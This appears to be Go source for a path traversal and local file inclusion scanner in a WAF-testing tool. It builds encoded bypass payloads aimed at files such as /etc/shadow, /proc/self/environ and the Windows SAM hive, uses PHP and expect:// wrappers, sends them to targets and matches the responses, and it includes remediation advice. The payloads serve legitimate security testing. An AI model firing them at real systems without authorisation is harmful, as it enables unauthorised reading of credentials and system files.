// Package traversal provides path traversal and local file inclusion detection.
// It tests for directory traversal, path normalization bypasses, LFI,
// and other file-based vulnerabilities.
package traversal

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/duration"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
	"github.com/waftester/waftester/pkg/ui"
)

// VulnerabilityType represents the type of traversal vulnerability
type VulnerabilityType string

const (
	VulnPathTraversal  VulnerabilityType = "path-traversal"
	VulnLFI            VulnerabilityType = "local-file-inclusion"
	VulnRFI            VulnerabilityType = "remote-file-inclusion"
	VulnNullByteBypass VulnerabilityType = "null-byte-bypass"
	VulnDoubleEncoding VulnerabilityType = "double-encoding-bypass"
	VulnPathNormalize  VulnerabilityType = "path-normalization-bypass"
	VulnFilenameBypass VulnerabilityType = "filename-bypass"
	VulnWrapperAbuse   VulnerabilityType = "php-wrapper-abuse"
)

// Severity levels for vulnerabilities
type Severity string

const (
	SeverityCritical Severity = "critical"
	SeverityHigh     Severity = "high"
	SeverityMedium   Severity = "medium"
	SeverityLow      Severity = "low"
	SeverityInfo     Severity = "info"
)

// Platform represents the target platform
type Platform string

const (
	PlatformLinux   Platform = "linux"
	PlatformWindows Platform = "windows"
	PlatformUnknown Platform = "unknown"
)

// Vulnerability represents a detected traversal vulnerability
type Vulnerability struct {
	Type        VulnerabilityType `json:"type"`
	Description string            `json:"description"`
	Severity    Severity          `json:"severity"`
	URL         string            `json:"url"`
	Parameter   string            `json:"parameter"`
	Payload     string            `json:"payload"`
	Evidence    string            `json:"evidence"`
	Remediation string            `json:"remediation"`
	CVSS        float64           `json:"cvss"`
	FileFound   string            `json:"file_found,omitempty"`
}

// Payload represents a traversal payload
type Payload struct {
	Value       string
	Description string
	Platform    Platform
	Depth       int  // Traversal depth
	Encoded     bool // Whether payload is encoded
}

// ScanResult contains the results of a traversal scan
type ScanResult struct {
	URL             string          `json:"url"`
	StartTime       time.Time       `json:"start_time"`
	EndTime         time.Time       `json:"end_time"`
	Duration        time.Duration   `json:"duration"`
	Vulnerabilities []Vulnerability `json:"vulnerabilities"`
	Platform        Platform        `json:"platform"`
	TestedParams    []string        `json:"tested_params"`
	TestedPayloads  int             `json:"tested_payloads"`
}

// TesterConfig configures the traversal tester
type TesterConfig struct {
	Timeout         time.Duration
	UserAgent       string
	Concurrency     int
	Platform        Platform // Target platform
	MaxDepth        int      // Maximum traversal depth
	TestParams      []string // Parameters to test
	Client          *http.Client
	CustomFiles     []string // Custom files to look for
	FollowRedirects bool
}

// Tester performs path traversal tests
type Tester struct {
	config       *TesterConfig
	client       *http.Client
	payloadCache map[Platform][]Payload // Cached payloads per platform
	cacheMu      sync.RWMutex
}

// DefaultConfig returns a default configuration
func DefaultConfig() *TesterConfig {
	return &TesterConfig{
		Timeout:         duration.HTTPFuzzing,
		UserAgent:       ui.UserAgent(),
		Concurrency:     defaults.ConcurrencyLow,
		Platform:        PlatformUnknown,
		MaxDepth:        defaults.DepthMax,
		FollowRedirects: false,
		TestParams: []string{
			"file",
			"path",
			"page",
			"document",
			"doc",
			"template",
			"include",
			"load",
			"read",
			"view",
			"content",
			"name",
			"filename",
			"filepath",
			"dir",
			"folder",
			"location",
			"src",
			"source",
			"url",
			"uri",
			"img",
			"image",
			"lang",
			"language",
		},
	}
}

// NewTester creates a new traversal tester
func NewTester(config *TesterConfig) *Tester {
	if config == nil {
		config = DefaultConfig()
	}

	client := config.Client
	if client == nil {
		client = httpclient.Default()
	}

	return &Tester{
		config:       config,
		client:       client,
		payloadCache: make(map[Platform][]Payload),
	}
}

// GetPayloads returns traversal payloads for the specified platform (cached)
func (t *Tester) GetPayloads(platform Platform) []Payload {
	// Check cache first
	t.cacheMu.RLock()
	if cached, ok := t.payloadCache[platform]; ok {
		t.cacheMu.RUnlock()
		return cached
	}
	t.cacheMu.RUnlock()

	// Generate payloads
	payloads := t.generatePayloads(platform)

	// Cache the result
	t.cacheMu.Lock()
	t.payloadCache[platform] = payloads
	t.cacheMu.Unlock()

	return payloads
}

// generatePayloads creates traversal payloads for the specified platform
func (t *Tester) generatePayloads(platform Platform) []Payload {
	// Pre-allocate with estimated capacity to reduce allocations
	// Estimate: 11 linux files * (1 direct + 6 depths * 20 patterns) + 6 windows files * similar + wrappers + nullbyte
	estimatedCap := 2500
	payloads := make([]Payload, 0, estimatedCap)

	// Determine depths to test
	depths := []int{1, 2, 3, 5, 8, 10}
	if t.config.MaxDepth > 0 {
		depths = make([]int, 0, t.config.MaxDepth)
		for i := 1; i <= t.config.MaxDepth; i++ {
			depths = append(depths, i)
		}
	}

	// Linux payloads
	linuxFiles := []string{
		"/etc/passwd",
		"/etc/shadow",
		"/etc/hosts",
		"/etc/hostname",
		"/proc/version",
		"/proc/self/environ",
		"/proc/self/cmdline",
		"/var/log/apache2/access.log",
		"/var/log/apache/access.log",
		"/var/log/nginx/access.log",
		"/var/log/httpd/access_log",
	}

	// Windows payloads
	windowsFiles := []string{
		"C:\\Windows\\System32\\drivers\\etc\\hosts",
		"C:\\Windows\\win.ini",
		"C:\\Windows\\System32\\config\\SAM",
		"C:\\boot.ini",
		"C:\\inetpub\\logs\\LogFiles",
		"C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
	}

	// Traversal patterns
	traversalPatterns := []struct {
		pattern string
		desc    string
		encoded bool
	}{
		{"../", "dot-dot-slash", false},
		{"..\\", "dot-dot-backslash", false},
		{"....//", "double-dot-slash", false},
		{"....\\\\", "double-dot-backslash", false},
		{"..\\/", "mixed slash", false},
		{"..%2f", "URL encoded", true},
		{"..%5c", "URL encoded backslash", true},
		{"%2e%2e%2f", "fully encoded", true},
		{"%2e%2e/", "partial encoded", true},
		{"%2e%2e%5c", "fully encoded backslash", true},
		{"..%252f", "double encoded", true},
		{"..%255c", "double encoded backslash", true},
		{"%252e%252e%252f", "double fully encoded", true},
		{"..%c0%af", "overlong UTF-8", true},
		{"..%ef%bc%8f", "UTF-8 fullwidth", true},
		{"..%c1%9c", "overlong backslash", true},
		{"....//....//", "double length", false},
		{".../", "triple dot", false},
		{"..;/", "semicolon bypass", false},
		{"..%00/", "null byte", true},
	}

	// Generate payloads for each platform
	if platform == PlatformLinux || platform == PlatformUnknown {
		for _, file := range linuxFiles {
			// Direct file access
			payloads = append(payloads, Payload{
				Value:       file,
				Description: "Direct file path",
				Platform:    PlatformLinux,
				Depth:       0,
				Encoded:     false,
			})

			// Traversal with depths
			for _, depth := range depths {
				for _, pattern := range traversalPatterns {
					if strings.Contains(pattern.pattern, "\\") {
						continue // Skip backslash patterns for Linux
					}

					traversal := strings.Repeat(pattern.pattern, depth)
					// Remove leading slash from file path for traversal
					filePath := strings.TrimPrefix(file, "/")

					payloads = append(payloads, Payload{
						Value:       traversal + filePath,
						Description: fmt.Sprintf("%s depth %d", pattern.desc, depth),
						Platform:    PlatformLinux,
						Depth:       depth,
						Encoded:     pattern.encoded,
					})
				}
			}
		}
	}

	if platform == PlatformWindows || platform == PlatformUnknown {
		for _, file := range windowsFiles {
			// Direct file access
			payloads = append(payloads, Payload{
				Value:       file,
				Description: "Direct file path",
				Platform:    PlatformWindows,
				Depth:       0,
				Encoded:     false,
			})

			// Traversal with depths
			for _, depth := range depths {
				for _, pattern := range traversalPatterns {
					if strings.Contains(pattern.pattern, "/") && !strings.Contains(pattern.pattern, "\\") {
						continue // Skip forward-slash-only patterns for Windows
					}

					traversal := strings.Repeat(pattern.pattern, depth)
					// Get just filename for traversal
					parts := strings.Split(file, "\\")
					filePath := parts[len(parts)-1]

					payloads = append(payloads, Payload{
						Value:       traversal + filePath,
						Description: fmt.Sprintf("%s depth %d", pattern.desc, depth),
						Platform:    PlatformWindows,
						Depth:       depth,
						Encoded:     pattern.encoded,
					})
				}
			}
		}
	}

	// PHP wrapper payloads
	phpWrappers := []Payload{
		{Value: "php://filter/convert.base64-encode/resource=index.php", Description: "PHP filter base64", Platform: PlatformUnknown, Encoded: false},
		{Value: "php://filter/read=string.rot13/resource=index.php", Description: "PHP filter rot13", Platform: PlatformUnknown, Encoded: false},
		{Value: "php://input", Description: "PHP input wrapper", Platform: PlatformUnknown, Encoded: false},
		{Value: "php://data", Description: "PHP data wrapper", Platform: PlatformUnknown, Encoded: false},
		{Value: "expect://id", Description: "Expect wrapper", Platform: PlatformUnknown, Encoded: false},
		{Value: "file:///etc/passwd", Description: "File protocol", Platform: PlatformLinux, Encoded: false},
		{Value: "file://C:/Windows/win.ini", Description: "File protocol Windows", Platform: PlatformWindows, Encoded: false},
	}
	payloads = append(payloads, phpWrappers...)

	// Null byte injection payloads
	nullBytePayloads := []Payload{
		{Value: "../../../etc/passwd%00", Description: "Null byte suffix", Platform: PlatformLinux, Encoded: true},
		{Value: "../../../etc/passwd%00.jpg", Description: "Null byte with extension", Platform: PlatformLinux, Encoded: true},
		{Value: "../../../etc/passwd\x00", Description: "Literal null byte", Platform: PlatformLinux, Encoded: false},
	}
	payloads = append(payloads, nullBytePayloads...)

	return payloads
}

// DetectPlatform attempts to detect the target platform
func (t *Tester) DetectPlatform(ctx context.Context, targetURL string) (Platform, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return PlatformUnknown, err
	}
	req.Header.Set("User-Agent", t.config.UserAgent)

	resp, err := t.client.Do(req)
	if err != nil {
		return PlatformUnknown, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	// Check Server header
	server := strings.ToLower(resp.Header.Get("Server"))

	if strings.Contains(server, "iis") || strings.Contains(server, "microsoft") {
		return PlatformWindows, nil
	}

	if strings.Contains(server, "apache") || strings.Contains(server, "nginx") ||
		strings.Contains(server, "unix") || strings.Contains(server, "ubuntu") {
		return PlatformLinux, nil
	}

	// Check X-Powered-By
	powered := strings.ToLower(resp.Header.Get("X-Powered-By"))
	if strings.Contains(powered, "asp") || strings.Contains(powered, "iis") {
		return PlatformWindows, nil
	}

	return PlatformUnknown, nil
}

// TestParameter tests a specific parameter for path traversal
func (t *Tester) TestParameter(ctx context.Context, targetURL string, param string, payloads []Payload) ([]Vulnerability, error) {
	var vulns []Vulnerability

	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	for _, payload := range payloads {
		q := u.Query()
		q.Set(param, payload.Value)
		u.RawQuery = q.Encode()
		testURL := u.String()

		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", t.config.UserAgent)

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}

		body := readBodyLimit(resp, 100*1024)
		iohelper.DrainAndClose(resp.Body)

		// Check for evidence of successful traversal
		evidence := t.detectEvidence(body, payload.Platform)
		if evidence != "" {
			vulns = append(vulns, Vulnerability{
				Type:        getVulnType(payload),
				Description: fmt.Sprintf("Path traversal via parameter '%s' using %s", param, payload.Description),
				Severity:    SeverityHigh,
				URL:         testURL,
				Parameter:   param,
				Payload:     payload.Value,
				Evidence:    evidence,
				Remediation: GetTraversalRemediation(),
				CVSS:        7.5,
				FileFound:   identifyFile(evidence),
			})
		}
	}

	return vulns, nil
}

// detectEvidence checks response body for signs of successful traversal
func (t *Tester) detectEvidence(body string, platform Platform) string {
	// Linux file signatures
	linuxPatterns := []struct {
		pattern *regexp.Regexp
		desc    string
	}{
		{regexp.MustCompile(`root:.*:0:0:`), "passwd file content"},
		{regexp.MustCompile(`daemon:.*:1:1:`), "passwd file content"},
		{regexp.MustCompile(`nobody:.*:65534:`), "passwd file content"},
		{regexp.MustCompile(`bin:.*:/bin:`), "passwd file content"},
		{regexp.MustCompile(`Linux version \d+\.\d+`), "kernel version"},
		{regexp.MustCompile(`127\.0\.0\.1\s+localhost`), "hosts file content"},
		{regexp.MustCompile(`PATH=`), "environment variable"},
		{regexp.MustCompile(`HOME=/`), "environment variable"},
		{regexp.MustCompile(`SHELL=/`), "environment variable"},
	}

	// Windows file signatures
	windowsPatterns := []struct {
		pattern *regexp.Regexp
		desc    string
	}{
		{regexp.MustCompile(`\[fonts\]`), "win.ini content"},
		{regexp.MustCompile(`\[extensions\]`), "win.ini content"},
		{regexp.MustCompile(`\[mci extensions\]`), "win.ini content"},
		{regexp.MustCompile(`Microsoft.*Windows`), "Windows identifier"},
		{regexp.MustCompile(`\[boot loader\]`), "boot.ini content"},
		{regexp.MustCompile(`default=multi`), "boot.ini content"},
		{regexp.MustCompile(`127\.0\.0\.1\s+localhost`), "hosts file content"},
	}

	// Check based on platform
	if platform == PlatformLinux || platform == PlatformUnknown {
		for _, p := range linuxPatterns {
			if match := p.pattern.FindString(body); match != "" {
				return fmt.Sprintf("%s: %s", p.desc, truncate(match, 100))
			}
		}
	}

	if platform == PlatformWindows || platform == PlatformUnknown {
		for _, p := range windowsPatterns {
			if match := p.pattern.FindString(body); match != "" {
				return fmt.Sprintf("%s: %s", p.desc, truncate(match, 100))
			}
		}
	}

	// PHP wrapper evidence
	phpPatterns := []struct {
		pattern *regexp.Regexp
		desc    string
	}{
		{regexp.MustCompile(`<\?php`), "PHP source code"},
		{regexp.MustCompile(`<\?=`), "PHP short tag"},
		{regexp.MustCompile(`PHBocA==`), "Base64 PHP tag"}, // <?php base64 encoded
	}

	for _, p := range phpPatterns {
		if match := p.pattern.FindString(body); match != "" {
			return fmt.Sprintf("%s: %s", p.desc, truncate(match, 100))
		}
	}

	return ""
}

// identifyFile attempts to identify which file was accessed
func identifyFile(evidence string) string {
	fileIndicators := map[string]string{
		"passwd file":    "/etc/passwd",
		"kernel version": "/proc/version",
		"hosts file":     "hosts",
		"environment":    "/proc/self/environ",
		"win.ini":        "win.ini",
		"boot.ini":       "boot.ini",
		"PHP source":     "PHP file",
	}

	for indicator, file := range fileIndicators {
		if strings.Contains(strings.ToLower(evidence), strings.ToLower(indicator)) {
			return file
		}
	}

	return ""
}

// getVulnType determines the vulnerability type from payload
func getVulnType(payload Payload) VulnerabilityType {
	if strings.Contains(payload.Value, "php://") || strings.Contains(payload.Value, "file://") ||
		strings.Contains(payload.Value, "expect://") || strings.Contains(payload.Value, "data://") {
		return VulnWrapperAbuse
	}
	if strings.Contains(payload.Value, "%00") || strings.Contains(payload.Value, "\x00") {
		return VulnNullByteBypass
	}
	if strings.Contains(payload.Value, "%25") {
		return VulnDoubleEncoding
	}
	if payload.Encoded {
		return VulnPathNormalize
	}
	return VulnPathTraversal
}

// Scan performs a comprehensive traversal scan
func (t *Tester) Scan(ctx context.Context, targetURL string) (*ScanResult, error) {
	startTime := time.Now()
	result := &ScanResult{
		URL:       targetURL,
		StartTime: startTime,
	}

	// Detect platform
	platform, _ := t.DetectPlatform(ctx, targetURL)
	if t.config.Platform != PlatformUnknown {
		platform = t.config.Platform
	}
	result.Platform = platform

	// Get payloads for platform
	payloads := t.GetPayloads(platform)
	result.TestedPayloads = len(payloads)

	// Test each parameter
	for _, param := range t.config.TestParams {
		vulns, err := t.TestParameter(ctx, targetURL, param, payloads)
		if err != nil {
			continue
		}
		result.Vulnerabilities = append(result.Vulnerabilities, vulns...)
		result.TestedParams = append(result.TestedParams, param)
	}

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(startTime)

	return result, nil
}

// TestURL tests a specific URL for traversal in the path itself
func (t *Tester) TestURL(ctx context.Context, targetURL string) ([]Vulnerability, error) {
	var vulns []Vulnerability

	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	basePath := u.Path

	// Path traversal payloads in URL
	pathPayloads := []string{
		"../../../etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
	}

	for _, payload := range pathPayloads {
		u.Path = basePath + "/" + payload
		testURL := u.String()

		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", t.config.UserAgent)

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}

		body := readBodyLimit(resp, 100*1024)
		iohelper.DrainAndClose(resp.Body)

		evidence := t.detectEvidence(body, PlatformUnknown)
		if evidence != "" {
			vulns = append(vulns, Vulnerability{
				Type:        VulnPathTraversal,
				Description: "Path traversal in URL path",
				Severity:    SeverityHigh,
				URL:         testURL,
				Payload:     payload,
				Evidence:    evidence,
				Remediation: GetTraversalRemediation(),
				CVSS:        7.5,
			})
		}
	}

	return vulns, nil
}

// Helper functions

func readBodyLimit(resp *http.Response, limit int64) string {
	data, err := io.ReadAll(io.LimitReader(resp.Body, limit))
	if err != nil {
		return ""
	}
	return string(data)
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// Remediation guidance

// GetTraversalRemediation returns remediation for path traversal
func GetTraversalRemediation() string {
	return `To fix path traversal vulnerabilities:
1. Validate and sanitize all user input that references files
2. Use an allowlist of permitted files/directories
3. Normalize paths and check for traversal sequences after decoding
4. Use chroot or jail environments to restrict file access
5. Implement proper access controls on the file system
6. Avoid passing user input directly to file operations
7. Use secure path joining functions that prevent traversal`
}

// GetLFIRemediation returns remediation for LFI
func GetLFIRemediation() string {
	return `To fix local file inclusion vulnerabilities:
1. Avoid including files based on user input
2. Use a whitelist of allowed files to include
3. Ensure included files are in expected directory
4. Disable dangerous PHP wrappers (allow_url_include=Off)
5. Use realpath() to resolve paths before inclusion
6. Implement proper input validation`
}

// AllVulnerabilityTypes returns all traversal vulnerability types
func AllVulnerabilityTypes() []VulnerabilityType {
	return []VulnerabilityType{
		VulnPathTraversal,
		VulnLFI,
		VulnRFI,
		VulnNullByteBypass,
		VulnDoubleEncoding,
		VulnPathNormalize,
		VulnFilenameBypass,
		VulnWrapperAbuse,
	}
}

// GenerateTraversalSequence generates a traversal sequence of given depth
func GenerateTraversalSequence(depth int, separator string) string {
	return strings.Repeat(".."+separator, depth)
}

// EncodeTraversal encodes a traversal payload with various techniques
func EncodeTraversal(payload string, encoding string) string {
	switch encoding {
	case "url":
		return strings.ReplaceAll(strings.ReplaceAll(payload, "..", "%2e%2e"), "/", "%2f")
	case "double":
		return strings.ReplaceAll(strings.ReplaceAll(payload, "..", "%252e%252e"), "/", "%252f")
	case "unicode":
		return strings.ReplaceAll(strings.ReplaceAll(payload, "..", "%c0%ae%c0%ae"), "/", "%c0%af")
	default:
		return payload
	}
}

// CommonTraversalFiles returns commonly targeted files
func CommonTraversalFiles() []string {
	return []string{
		"/etc/passwd",
		"/etc/shadow",
		"/etc/hosts",
		"/etc/hostname",
		"/proc/self/environ",
		"/proc/version",
		"/var/log/apache2/access.log",
		"/var/log/auth.log",
		"C:\\Windows\\win.ini",
		"C:\\Windows\\System32\\drivers\\etc\\hosts",
		"C:\\boot.ini",
	}
}

// IsPathSafe checks if a path is safe (no traversal)
func IsPathSafe(path string) bool {
	// Decode URL encoding
	decoded, _ := url.QueryUnescape(path)
	if decoded == "" {
		decoded = path
	}

	// Double decode
	doubleDec, _ := url.QueryUnescape(decoded)
	if doubleDec != "" {
		decoded = doubleDec
	}

	// Check for traversal patterns
	dangerousPatterns := []string{
		"..",
		"./",
		".\\",
		"%2e",
		"%2f",
		"%5c",
		"..;",
		".../",
		"....//",
	}

	lower := strings.ToLower(decoded)
	for _, pattern := range dangerousPatterns {
		if strings.Contains(lower, pattern) {
			return false
		}
	}

	return true
}
